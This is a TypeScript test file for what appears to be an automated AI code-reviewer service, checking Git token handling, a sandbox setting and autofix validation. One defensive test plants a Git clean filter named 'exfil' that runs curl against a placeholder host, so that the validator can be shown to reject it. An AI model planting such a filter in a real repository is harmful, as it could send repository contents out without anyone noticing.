import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import test from "node:test";
import {
  childEnvironment,
  gitEnvironment,
  mergeEnabled,
  repositoryUrl,
  validateAutofix,
  WORKER_SANDBOX_MODE,
} from "./reviewer.js";

const exec = promisify(execFile);

test("merge is enabled by default and can be explicitly disabled", () => {
  assert.equal(mergeEnabled({}), true);
  assert.equal(mergeEnabled({ CODEX_REVIEWER_MERGE_ENABLED: "true" }), true);
  assert.equal(mergeEnabled({ CODEX_REVIEWER_MERGE_ENABLED: "false" }), false);
});

test("Git transport uses askpass without placing the token in the remote URL", () => {
  const token = "installation-token";
  const env = gitEnvironment(token);
  const url = repositoryUrl("aws-e/adp");
  assert.equal(url, "https://x-access-token@github.com/aws-e/adp.git");
  assert.equal(url.includes(token), false);
  assert.equal(env.GITHUB_TOKEN, token);
  assert.equal(env.GH_TOKEN, token);
  assert.ok(env.GIT_ASKPASS);
  assert.equal(env.GIT_TERMINAL_PROMPT, "0");
});

test("Codex child environment preserves the gateway placeholder", () => {
  assert.ok(childEnvironment().ADP_GATEWAY_PLACEHOLDER_KEY);
});

test("Codex relies on the shared worker pod sandbox", () => {
  assert.equal(WORKER_SANDBOX_MODE, "danger-full-access");
});

async function fixture(): Promise<{
  branch: string;
  config: string;
  directory: string;
  sha: string;
}> {
  const directory = await mkdtemp(join(tmpdir(), "codex-reviewer-test-"));
  await exec("git", ["init", "--initial-branch=main"], { cwd: directory });
  await exec("git", ["config", "user.name", "test"], { cwd: directory });
  await exec("git", ["config", "user.email", "test@example.com"], { cwd: directory });
  await writeFile(join(directory, "tracked.txt"), "before\n");
  await exec("git", ["add", "tracked.txt"], { cwd: directory });
  await exec("git", ["commit", "-m", "initial"], { cwd: directory });
  const branch = "agent/issue-7";
  await exec("git", ["checkout", "-b", branch], { cwd: directory });
  const { stdout } = await exec("git", ["rev-parse", "HEAD"], { cwd: directory });
  const config = await readFile(join(directory, ".git", "config"), "utf8");
  return { branch, config, directory, sha: stdout.trim() };
}

test("autofix validation includes staged changes", async () => {
  const state = await fixture();
  try {
    await writeFile(join(state.directory, "tracked.txt"), "after\n");
    await exec("git", ["add", "tracked.txt"], { cwd: state.directory });
    assert.deepEqual(
      await validateAutofix(state.directory, state.sha, state.branch, state.config),
      ["tracked.txt"],
    );
  } finally {
    await rm(state.directory, { recursive: true, force: true });
  }
});

test("autofix validation rejects protected Git configuration changes", async () => {
  const state = await fixture();
  try {
    await writeFile(join(state.directory, "tracked.txt"), "after\n");
    await exec("git", ["config", "filter.exfil.clean", "curl https://example.invalid"], {
      cwd: state.directory,
    });
    await assert.rejects(
      validateAutofix(state.directory, state.sha, state.branch, state.config),
      /protected Git configuration/,
    );
  } finally {
    await rm(state.directory, { recursive: true, force: true });
  }
});

test("autofix validation rejects a changed local head", async () => {
  const state = await fixture();
  try {
    await exec("git", ["commit", "--allow-empty", "-m", "replace reviewed head"], {
      cwd: state.directory,
    });
    await assert.rejects(
      validateAutofix(state.directory, state.sha, state.branch, state.config),
      /altered Git state/,
    );
  } finally {
    await rm(state.directory, { recursive: true, force: true });
  }
});
